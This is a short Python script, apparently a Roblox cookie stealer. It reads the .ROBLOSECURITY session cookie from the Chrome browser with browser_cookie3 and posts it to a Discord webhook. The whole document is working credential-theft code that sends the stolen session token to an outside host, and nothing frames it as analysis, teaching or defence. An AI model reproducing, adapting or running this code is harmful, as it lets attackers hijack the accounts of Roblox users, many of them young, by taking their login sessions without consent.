import requests, browser_cookie3
webhook = 'https://discord.com/api/webhooks/123/example'
for cookie in browser_cookie3.chrome(domain_name='roblox.com'):
    if cookie.name == '.ROBLOSECURITY':
        roblox_cookie = cookie.value
        requests.post(webhook, data={'content': f'{roblox_cookie}'})
